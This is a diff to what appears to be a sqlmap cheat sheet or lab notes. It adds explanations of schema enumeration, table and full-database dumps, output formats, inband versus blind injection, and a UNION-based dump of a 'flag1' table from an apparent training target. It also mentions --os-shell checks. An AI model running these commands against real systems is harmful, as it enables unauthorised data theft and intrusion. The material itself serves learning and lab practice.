@@ -35,6 +35,7 @@ sqlmap -u "TARGET" --tables -D testdb
 # List columns of a specific table
 sqlmap -u "TARGET" --columns -T users -D testdb
 ```
+> Three-step schema enumeration. Run each in sequence: first `--dbs` to find the interesting database, then `--tables -D <db>` to find the target table, then `--columns` to see what data it holds. Replace `TARGET`, `testdb`, and `users` with your target's values.
 
 ---
 
@@ -59,6 +60,7 @@ sqlmap -u "TARGET" --dump -D testdb
 # Dump EVERYTHING (skip system DBs)
 sqlmap -u "TARGET" --dump-all --exclude-sysdbs
 ```
+> Dump variants from targeted to comprehensive. Use `-C name,surname` to limit columns and speed up blind dumps. Use `--where=` to filter rows. `--start`/`--stop` paginate by row number — useful for slow blind injection. `--dump-all --exclude-sysdbs` gets everything user-created across all databases.
 
 Output is saved as CSV to `~/.local/share/sqlmap/output/<host>/dump/<db>/<table>.csv`.
 
@@ -67,6 +69,7 @@ Output is saved as CSV to `~/.local/share/sqlmap/output/<host>/dump/<db>/<table>
 sqlmap ... --dump --dump-format=HTML
 sqlmap ... --dump --dump-format=SQLITE
 ```
+> Saves dumped data in a different format. HTML is readable in a browser. SQLite lets you run SQL queries on the dumped data offline with `sqlite3`. Default format is CSV.
 
 > SQLite format is useful for offline analysis with `sqlite3` queries.
 
@@ -74,18 +77,18 @@ sqlmap ... --dump --dump-format=SQLITE
 
 ## Inband vs Blind Queries
 
-sqlmap's `queries.xml` defines two query variants per task:
+sqlmap's `queries.xml` defines two query variants for each task:
 
-- **inband** — used for UNION/error-based; full result returned in one request
-- **blind** — used for boolean/time-based; row-by-row, bit-by-bit retrieval with `LIMIT %d,1`
+- **inband** — used for UNION and error-based injection. The full result comes back in one request.
+- **blind** — used for boolean and time-based injection. Data is retrieved one row at a time, one bit at a time, using `LIMIT %d,1`.
 
-You don't choose — sqlmap picks based on the detected technique. Inband is always faster.
+You do not choose between them. sqlmap picks the right one based on the detected injection type. Inband is always faster.
 
 ---
 
 ## DB User vs OS User
 
-> The `root` user in DB context has NO relation to OS root. DB root has full DB privileges but limited OS access (file write needs FILE privilege + `secure_file_priv`). Don't assume DBA = system compromise — verify with `--os-shell` or LOAD_FILE checks.
+> The `root` user in the database (DB) context has no relation to the operating system (OS) root account. DB root has full DB privileges but limited OS access. Writing files requires the FILE privilege and a permissive `secure_file_priv` setting. Do not assume DBA equals full system compromise — verify with `--os-shell` or LOAD_FILE checks.
 
 ---
 
@@ -100,6 +103,7 @@ sqlmap -u "http://154.57.164.72:30732/case1.php?id=1" \
   --dbms=mysql --batch --technique=U --no-cast \
   --dump -T flag1 -D testdb
 ```
+> Dumps the `flag1` table from the `testdb` database via UNION injection. `--no-cast` is required here to prevent silent failures. Replace the IP, port, table, and database names for other targets.
 
 > `--no-cast` needed — without it the full UNION technique silently fails with "the SQL query provided does not return any output."
 
